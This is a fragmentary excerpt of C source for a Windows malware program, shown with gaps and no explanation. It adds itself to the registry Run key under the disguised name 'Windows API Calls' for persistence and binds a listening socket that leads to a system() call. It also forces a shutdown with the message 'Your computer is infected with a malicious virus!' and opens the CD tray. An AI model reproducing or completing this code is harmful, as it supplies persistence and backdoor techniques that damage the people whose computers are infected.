...
\\ Windows\\CurrentVersion\\Run”, &Install);
RegSetValueEx(Install, “Windows API Calls”, 0, REG_SZ,
...
if (bind (Socket, (SOCKADDR*) &service,sizeof(service)) ==
SOCKET_ERROR)
{
closesocket(Socket);
system(Module);
...
void Shutdown()
{
char Message [MAX_PATH]=”Your computer is infected with a
malicious virus!”;
InitiateSystemShutdown(NULL,Message,sizeof
(Message), true ,false );
}
...
{
OpenCloseCDTray();
const char c_CDTray[MAX_PATH]={“CD Tray opened. Closed if
not on a laptop .”};
